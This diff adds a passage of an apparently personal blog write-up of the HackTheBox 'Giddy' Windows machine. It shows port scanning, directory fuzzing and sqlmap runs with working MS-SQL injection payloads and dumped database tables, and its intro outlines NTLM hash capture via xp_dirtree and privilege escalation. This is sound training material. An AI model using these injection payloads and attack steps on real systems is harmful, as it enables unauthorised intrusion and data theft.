@@ -1,0 +1,1254 @@
+I"m�<p><strong>Giddy</strong> is a super cool box which gives real-life experience by <strong>Bypassing Windows Defender</strong>, <strong>Applock</strong> and <strong>Constrained Language Mode</strong>.
+It starts with enumeration leading to a site which is vulnerable to <strong>SQL injection</strong> on <strong>MS-SQL</strong>. I’ll abuse SQL-Injection to make giddy a SMB connect to me, through <strong>xp_dirtree</strong> giving me the <strong>NTLM-v2</strong> challenge, which I can crack to get a password for user stacy. I’ll use that password with <strong>WinRM</strong> service running on giddy. To get system, I’ll exploit a vulnerability in <strong>Ubiquiti UniFi Video</strong>.</p>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="masscan--nmap">Masscan + Nmap</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>5000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 80/tcp on 10.10.10.104
+Discovered open port 3389/tcp on 10.10.10.104
+Discovered open port 443/tcp on 10.10.10.104
+Discovered open port 5985/tcp on 10.10.10.104
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Parse those ports to nmap:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
+<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2018-06-16T21:28:55
+| Not valid after:  2018-09-14T21:28:55
+| MD5:   78a7 4af5 3b09 c882 a149 f977 cf8f 1182
+|_SHA-1: 8adc 3379 878a f13f 0154 406a 3ead d345 6967 6a23
+|_ssl-date: 2021-08-10T16:50:55+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+| tls-alpn:
+|   h2
+|_  http/1.1
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: GIDDY
+|   NetBIOS_Domain_Name: GIDDY
+|   NetBIOS_Computer_Name: GIDDY
+|   DNS_Domain_Name: Giddy
+|   DNS_Computer_Name: Giddy
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-08-10T16:50:52+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Giddy
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>Giddy
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-03T14:56:04
+| Not valid after:  2021-11-02T14:56:04
+| MD5:   aa42 a9f1 1181 e790 9d59 28dd 7879 5878
+|_SHA-1: f5ac fe1b ea5a 81ad a917 c1c2 0087 90a8 1bed 5dc5
+|_ssl-date: 2021-08-10T16:50:55+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Since 3389 is Remote Desktop Protocol and 5985 is Windows Remote Management, I’ll just ignore that.</p>
+<h2 id="https-80443">HTTP/S (80,443)</h2>
+<p>Banner grabbing:
+Port 80:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-v</span> giddy.htb 80
+giddy.htb <span class="o">[</span>10.10.10.104] 80 <span class="o">(</span>http<span class="o">)</span> open
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Port 443:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> giddy.htb:443
+CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
+<span class="nv">depth</span><span class="o">=</span>0 CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+verify error:num<span class="o">=</span>66:EE certificate key too weak
+verify <span class="k">return</span>:1
+<span class="nv">depth</span><span class="o">=</span>0 CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+verify error:num<span class="o">=</span>18:self signed certificate
+verify <span class="k">return</span>:1
+<span class="nv">depth</span><span class="o">=</span>0 CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+verify error:num<span class="o">=</span>10:certificate has expired
+<span class="nv">notAfter</span><span class="o">=</span>Sep 14 21:28:55 2018 GMT
+verify <span class="k">return</span>:1
+<span class="nv">depth</span><span class="o">=</span>0 CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+<span class="nv">notAfter</span><span class="o">=</span>Sep 14 21:28:55 2018 GMT
+verify <span class="k">return</span>:1
+<span class="nt">---</span>
+Certificate chain
+ 0 s:CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+   i:CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+<span class="nt">---</span>
+Server certificate
+<span class="nt">-----BEGIN</span> CERTIFICATE-----
+MIICHTCCAYagAwIBAgIQG2rbVjzfZqJIr005rMK4xTANBgkqhkiG9w0BAQUFADAp
+MScwJQYDVQQDDB5Qb3dlclNoZWxsV2ViQWNjZXNzVGVzdFdlYlNpdGUwHhcNMTgw
+NjE2MjEyODU1WhcNMTgwOTE0MjEyODU1WjApMScwJQYDVQQDDB5Qb3dlclNoZWxs
+V2ViQWNjZXNzVGVzdFdlYlNpdGUwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGB
+ALOvHao3JEpJzzBHR9oCc+934QLPu2vRlC7jZAwySPX6v6fkvzsDr7uD50maLVtW
+9etn9KVwfmgkYd6YtY+86YCc935s1rppNtNKeVXsG/PM4G+4HdPFf1Ik3Vj6fc1y
+w1nx2PLSNvlC74kkc33MA8y//vxqIckSJiHiVa5ZzdR/AgMBAAGjRjBEMBMGA1Ud
+JQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBS4T3PavA05OLCMaCa6GqgXsjCoozAO
+BgNVHQ8BAf8EBAMCBSAwDQYJKoZIhvcNAQEFBQADgYEAm6FzHooZ+SSLNp9KvPdX
+jjFPpf9Jv4j8Ao9qv1RnbwmTE5SSHhusXDOiAIOsErTVdaNa0VRcduMt+H054kfp
+1MeoYvKXuXlMLbGe+orEIiVPjC/7cTJIVyfgyhdl5PdtetlZGrspK8h+2QqvxXpF
+im+bXy93yFQ6G9tOrzpBmFY<span class="o">=</span>
+<span class="nt">-----END</span> CERTIFICATE-----
+<span class="nv">subject</span><span class="o">=</span>CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+
+<span class="nv">issuer</span><span class="o">=</span>CN <span class="o">=</span> PowerShellWebAccessTestWebSite
+
+<span class="nt">---</span>
+No client certificate CA names sent
+Peer signing digest: SHA256
+Peer signature <span class="nb">type</span>: RSA
+Server Temp Key: X25519, 253 bits
+<span class="nt">---</span>
+SSL handshake has <span class="nb">read </span>872 bytes and written 394 bytes
+Verification error: certificate has expired
+<span class="nt">---</span>
+New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
+Server public key is 1024 bit
+Secure Renegotiation IS supported
+Compression: NONE
+Expansion: NONE
+No ALPN negotiated
+SSL-Session:
+    Protocol  : TLSv1.2
+    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
+    Session-ID: E03E00009192AECBEB4F462B7D6E9AD8FDFC7978F8219775000A3C3120C717BC
+    Session-ID-ctx:
+    Master-Key: 8823643E99E7EDC8CAD9FBB10FAE8266DA757459F13C60D89BF8DA8B365547F981BCA7F7EAD93FBCCD961EC0A38CF6D6
+    PSK identity: None
+    PSK identity hint: None
+    SRP username: None
+    Start Time: 1628614816
+    Timeout   : 7200 <span class="o">(</span>sec<span class="o">)</span>
+    Verify <span class="k">return </span>code: 10 <span class="o">(</span>certificate has expired<span class="o">)</span>
+    Extended master secret: <span class="nb">yes</span>
+<span class="nt">---</span>
+<span class="nb">read</span>:errno<span class="o">=</span>104
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Directory listing:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://giddy.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-e</span> .txt,.html,.asp,.aspx
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://giddy.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+ :: Extensions       : .txt .html .asp .aspx
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+aspnet_client           [Status: 301, Size: 154, Words: 9, Lines: 2]
+.                       [Status: 200, Size: 700, Words: 27, Lines: 32]
+remote                  [Status: 302, Size: 157, Words: 6, Lines: 4]
+Remote                  [Status: 302, Size: 157, Words: 6, Lines: 4]
+Aspnet_client           [Status: 301, Size: 154, Words: 9, Lines: 2]
+mvc                     [Status: 301, Size: 144, Words: 9, Lines: 2]
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/aspnet_client</code> gives 403 on visiting, <code class="language-plaintext highlighter-rouge">/remote</code> gives a login page. <code class="language-plaintext highlighter-rouge">/mvc</code> is a browsable page with many functionalities.</p>
+
+<p><img src="/assets/img/Posts/Giddy/giddy-1.png" alt="giddy-1.png" /></p>
+
+<h1 id="sql-injection-on-ms-sql">SQL injection on MS-SQL</h1>
+<ul>
+  <li>I tried registering, logging in, checking cookies If they’re weak, that didn’t work.</li>
+  <li>Tried SQL injection on login and register form, that didn’t work.</li>
+  <li>Tried SQL injection on the search functionality, that worked!</li>
+</ul>
+
+<p><img src="/assets/img/Posts/Giddy/giddy-2.png" alt="giddy-2.png" /></p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sqlmap</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-r</span> req <span class="nt">--batch</span> <span class="nt">--threads</span> 10 <span class="nt">-p</span> <span class="s1">'ctl00$MainContent$SearchTerm'</span>
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 492 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+<span class="nt">---</span>
+Parameter: ctl00<span class="nv">$MainContent$SearchTerm</span> <span class="o">(</span>POST<span class="o">)</span>
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span>
+    Payload: <span class="nv">__EVENTTARGET</span><span class="o">=</span>&amp;__EVENTARGUMENT<span class="o">=</span>&amp;__VIEWSTATE<span class="o">=</span>++apU0dzA/DhnZFxzvEphcUipEKPCKz6JNBI7JbP0A344TAIw5EKvC4DcFrkjtlEKkS8lqg0YLKiBjxR3b4zwnnJuAua570S/pnA1sFDLWBsn5ek71qcQ8/Y4YcgWQf3FdPOq5IeeAfRAyU/8hhALHhes9lSe5PivOy9BoPbzwrxT5Hq/zv58i0PsVfK8tMV5TxOfzqgjqqln51Ro1CIB7wNnoVie67UfQCP2jGmNirhcJBajDpW9O4VvNK5E+iOb36wVjxDpmqQD4LVLy3fCjCJ3+AjjsCGVu4LeVw/2+N9zW2h6SJQG0u431PXcCyRkKEMKux+uI26kpZ7kymg57eHbd2wPDrGtJOw9OZ4QKdZEb/EDUla9t37beTsx6gXT9wHdwlN+BMuVSCvgKQF58N1TvJgxkbH2sS8R89Aq0NVPHCfhxHH/Q+zBBwKqpQW8s9REyESJZ+SdLLZEUCOZKFii5B/sJewLU8MFH/3nMuje+rP6zefkzruIT0pUMrliGE7EBiKmrbQscjJZ6N8ZqkSjCDNVMuZ3z4rEAKkv74<span class="o">=</span>&amp;__VIEWSTATEGENERATOR<span class="o">=</span>7DDB321F&amp;__EVENTVALIDATION<span class="o">=</span>XFZH5uNbiCOXA1WF2jvUn27EwXr1phpfomQ4ZdIJVmTwl8LhczAHqXKXIrzHpj0xc/7tnrnyaTXWaYNoRpZ4zzOiBqb2PKN+TOS912S7R52cKoSI5MySJLc/sM1bauU3ABH+TCiN4VbMdN5q2BISUkpqaU/h/ylBcSINV7fRv8w<span class="o">=</span>&amp;ctl00<span class="nv">$MainContent$SearchTerm</span><span class="o">=</span>hello<span class="s1">';WAITFOR DELAY '</span>0:0:5<span class="s1">'--&amp;ctl00$MainContent$Button1=Search
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: __EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__VIEWSTATE=++apU0dzA/DhnZFxzvEphcUipEKPCKz6JNBI7JbP0A344TAIw5EKvC4DcFrkjtlEKkS8lqg0YLKiBjxR3b4zwnnJuAua570S/pnA1sFDLWBsn5ek71qcQ8/Y4YcgWQf3FdPOq5IeeAfRAyU/8hhALHhes9lSe5PivOy9BoPbzwrxT5Hq/zv58i0PsVfK8tMV5TxOfzqgjqqln51Ro1CIB7wNnoVie67UfQCP2jGmNirhcJBajDpW9O4VvNK5E+iOb36wVjxDpmqQD4LVLy3fCjCJ3+AjjsCGVu4LeVw/2+N9zW2h6SJQG0u431PXcCyRkKEMKux+uI26kpZ7kymg57eHbd2wPDrGtJOw9OZ4QKdZEb/EDUla9t37beTsx6gXT9wHdwlN+BMuVSCvgKQF58N1TvJgxkbH2sS8R89Aq0NVPHCfhxHH/Q+zBBwKqpQW8s9REyESJZ+SdLLZEUCOZKFii5B/sJewLU8MFH/3nMuje+rP6zefkzruIT0pUMrliGE7EBiKmrbQscjJZ6N8ZqkSjCDNVMuZ3z4rEAKkv74=&amp;__VIEWSTATEGENERATOR=7DDB321F&amp;__EVENTVALIDATION=XFZH5uNbiCOXA1WF2jvUn27EwXr1phpfomQ4ZdIJVmTwl8LhczAHqXKXIrzHpj0xc/7tnrnyaTXWaYNoRpZ4zzOiBqb2PKN+TOS912S7R52cKoSI5MySJLc/sM1bauU3ABH+TCiN4VbMdN5q2BISUkpqaU/h/ylBcSINV7fRv8w=&amp;ctl00$MainContent$SearchTerm=hello'</span> WAITFOR DELAY <span class="s1">'0:0:5'</span><span class="nt">--</span> Xxky&amp;ctl00<span class="nv">$MainContent$Button1</span><span class="o">=</span>Search
+<span class="nt">---</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>But here SQLmap wasn’t able to recognize the database. 
+I got another endpoint with SQL injection: <code class="language-plaintext highlighter-rouge">http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=8</code> which is at products displayed at homepage.</p>
+
+<p><img src="/assets/img/Posts/Giddy/giddy-3.png" alt="giddy-3.png" /></p>
+
+<p>Running <code class="language-plaintext highlighter-rouge">sqlmap</code> on it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId<span class="o">=</span>8 <span class="nt">-p</span> ProductSubCategoryId <span class="nt">--batch</span> <span class="nt">--dbs</span>
+
+Parameter: ProductSubCategoryId <span class="o">(</span>GET<span class="o">)</span>
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: <span class="nv">ProductSubCategoryId</span><span class="o">=</span>8 AND <span class="nv">4485</span><span class="o">=</span>4485
+
+    Type: inline query
+    Title: Generic inline queries
+    Payload: <span class="nv">ProductSubCategoryId</span><span class="o">=(</span>SELECT CONCAT<span class="o">(</span>CONCAT<span class="o">(</span>CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>122<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)</span>,<span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">2151</span><span class="o">=</span>2151<span class="o">)</span> THEN CHAR<span class="o">(</span>49<span class="o">)</span> ELSE CHAR<span class="o">(</span>48<span class="o">)</span> END<span class="o">))</span>,CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>106<span class="o">)</span>+CHAR<span class="o">(</span>98<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)))</span>
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause <span class="o">(</span>IN<span class="o">)</span>
+    Payload: <span class="nv">ProductSubCategoryId</span><span class="o">=</span>8 AND 1839 IN <span class="o">(</span>SELECT <span class="o">(</span>CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>122<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)</span>+<span class="o">(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">1839</span><span class="o">=</span>1839<span class="o">)</span> THEN CHAR<span class="o">(</span>49<span class="o">)</span> ELSE CHAR<span class="o">(</span>48<span class="o">)</span> END<span class="o">))</span>+CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>106<span class="o">)</span>+CHAR<span class="o">(</span>98<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)))</span>
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span>
+    Payload: <span class="nv">ProductSubCategoryId</span><span class="o">=</span>8<span class="p">;</span>WAITFOR DELAY <span class="s1">'0:0:5'</span><span class="nt">--</span>
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind <span class="o">(</span>IF<span class="o">)</span>
+    Payload: <span class="nv">ProductSubCategoryId</span><span class="o">=</span>8 WAITFOR DELAY <span class="s1">'0:0:5'</span>
+
+    Type: UNION query
+    Title: Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 25 columns
+    Payload: <span class="nv">ProductSubCategoryId</span><span class="o">=</span>8 UNION ALL SELECT NULL,NULL,CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>122<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>106<span class="o">)</span>+CHAR<span class="o">(</span>117<span class="o">)</span>+CHAR<span class="o">(</span>71<span class="o">)</span>+CHAR<span class="o">(</span>97<span class="o">)</span>+CHAR<span class="o">(</span>109<span class="o">)</span>+CHAR<span class="o">(</span>88<span class="o">)</span>+CHAR<span class="o">(</span>116<span class="o">)</span>+CHAR<span class="o">(</span>87<span class="o">)</span>+CHAR<span class="o">(</span>117<span class="o">)</span>+CHAR<span class="o">(</span>111<span class="o">)</span>+CHAR<span class="o">(</span>119<span class="o">)</span>+CHAR<span class="o">(</span>110<span class="o">)</span>+CHAR<span class="o">(</span>90<span class="o">)</span>+CHAR<span class="o">(</span>84<span class="o">)</span>+CHAR<span class="o">(</span>76<span class="o">)</span>+CHAR<span class="o">(</span>101<span class="o">)</span>+CHAR<span class="o">(</span>70<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>66<span class="o">)</span>+CHAR<span class="o">(</span>102<span class="o">)</span>+CHAR<span class="o">(</span>79<span class="o">)</span>+CHAR<span class="o">(</span>86<span class="o">)</span>+CHAR<span class="o">(</span>80<span class="o">)</span>+CHAR<span class="o">(</span>83<span class="o">)</span>+CHAR<span class="o">(</span>118<span class="o">)</span>+CHAR<span class="o">(</span>78<span class="o">)</span>+CHAR<span class="o">(</span>78<span class="o">)</span>+CHAR<span class="o">(</span>105<span class="o">)</span>+CHAR<span class="o">(</span>87<span class="o">)</span>+CHAR<span class="o">(</span>105<span class="o">)</span>+CHAR<span class="o">(</span>85<span class="o">)</span>+CHAR<span class="o">(</span>74<span class="o">)</span>+CHAR<span class="o">(</span>111<span class="o">)</span>+CHAR<span class="o">(</span>88<span class="o">)</span>+CHAR<span class="o">(</span>115<span class="o">)</span>+CHAR<span class="o">(</span>108<span class="o">)</span>+CHAR<span class="o">(</span>69<span class="o">)</span>+CHAR<span class="o">(</span>75<span class="o">)</span>+CHAR<span class="o">(</span>104<span class="o">)</span>+CHAR<span class="o">(</span>65<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)</span>+CHAR<span class="o">(</span>106<span class="o">)</span>+CHAR<span class="o">(</span>98<span class="o">)</span>+CHAR<span class="o">(</span>120<span class="o">)</span>+CHAR<span class="o">(</span>113<span class="o">)</span>,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KJQS
+<span class="nt">---</span>
+<span class="o">[</span>18:36:51] <span class="o">[</span>INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 10 or 2016 or 2019
+web application technology: ASP.NET, Microsoft IIS 10.0, ASP.NET 4.0.30319
+back-end DBMS: Microsoft SQL Server 2016
+<span class="o">[</span>18:36:51] <span class="o">[</span>INFO] fetching database names
+available databases <span class="o">[</span>5]:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Injection
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> model
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> msdb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> tempdb
+
+<span class="o">[</span>18:36:51] <span class="o">[</span>INFO] fetched data logged to text files under <span class="s1">'/root/.sqlmap/output/giddy.htb'</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ending @ 18:36:51 /2021-08-11/
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="dumping-databases">Dumping databases</h1>
+<ul>
+  <li>Path <code class="language-plaintext highlighter-rouge">C:\\tmp\\Injection.bak</code> from <code class="language-plaintext highlighter-rouge">msdb</code>.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre>Database: msdb
+Table: backupfile
+<span class="o">[</span>2 entries]
++--------------------------------------+---------------+--------------------------------------+------------------------+-------+----------+-----------+-----------+-----------+------------+------------+------------+-------------+-------------+-------------+-------------------------+-------------------------------------------------------------------------------------------+---------------+----------------+----------------+----------------+--------------------+---------------------+----------------------+-----------------------+------------------------+
+| file_guid                            | backup_set_id | filegroup_guid                       | differential_base_guid | state | drop_lsn | file_size | file_type | page_size | create_lsn | is_present | state_desc | backup_size | file_number | is_readonly | logical_name            | physical_name                                                                             | read_only_lsn | filegroup_name | physical_drive | read_write_lsn | first_media_number | first_family_number | backed_up_page_count | differential_base_lsn | source_file_block_size |
++--------------------------------------+---------------+--------------------------------------+------------------------+-------+----------+-----------+-----------+-----------+------------+------------+------------+-------------+-------------+-------------+-------------------------+-------------------------------------------------------------------------------------------+---------------+----------------+----------------+----------------+--------------------+---------------------+----------------------+-----------------------+------------------------+
+| 40FA46CD-DFA9-40E1-90E5-5BE7CA6783EA | 1             | 00000000-0000-0000-0000-000000000000 | NULL                   | NULL  | NULL     | 214958080 | D         | 8192      | NULL       | True       | ONLINE     | 9043968     | 1           | NULL        | AdventureWorks2012_Data | C:<span class="se">\\</span>Program Files<span class="se">\\</span>Microsoft SQL Server<span class="se">\\</span>MSSQL13.SQLEXPRESS<span class="se">\\</span>MSSQL<span class="se">\\</span>DATA<span class="se">\\\\</span>Injection.mdf | NULL          | PRIMARY        | C:<span class="se">\\</span>           | NULL           | 1                  | 1                   | 1104                 | NULL                  | 512                    |
+| E16FAF18-F2EA-4BFB-9B8A-7F30D4F87B84 | 1             | NULL                                 | NULL                   | NULL  | NULL     | 1835008   | L         | NULL      | NULL       | True       | ONLINE     | 30720       | 2           | NULL        | AdventureWorks2012_Log  | C:<span class="se">\\</span>Program Files<span class="se">\\</span>Microsoft SQL Server<span class="se">\\</span>MSSQL13.SQLEXPRESS<span class="se">\\</span>MSSQL<span class="se">\\</span>DATA<span class="se">\\\\</span>Injection.ldf | NULL          | NULL           | C:<span class="se">\\</span>           | NULL           | 1                  | 1                   | 4                    | NULL                  | 512                    |
++--------------------------------------+---------------+--------------------------------------+------------------------+-------+----------+-----------+-----------+-----------+------------+------------+------------+-------------+-------------+-------------+-------------------------+-------------------------------------------------------------------------------------------+---------------+----------------+----------------+----------------+--------------------+---------------------+----------------------+-----------------------+------------------------+
+Database: msdb
+Table: backupmediafamily
+<span class="o">[</span>1 entry]
++--------------+--------------------------------------+--------+-------------+-------------+---------------------+---------------------+------------------------+------------------------+
+| media_set_id | media_family_id                      | mirror | device_type | media_count | logical_device_name | physical_block_size | physical_device_name   | family_sequence_number |
++--------------+--------------------------------------+--------+-------------+-------------+---------------------+---------------------+------------------------+------------------------+
+| 1            | BC04C265-0000-0000-0000-000000000000 | NULL   | 2           | 1           | NULL                | 512                 | C:<span class="se">\\</span>tmp<span class="se">\\</span>Injection.bak | 1                      |
++--------------+--------------------------------------+--------+-------------+-------------+---------------------+---------------------+------------------------+------------------------+
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
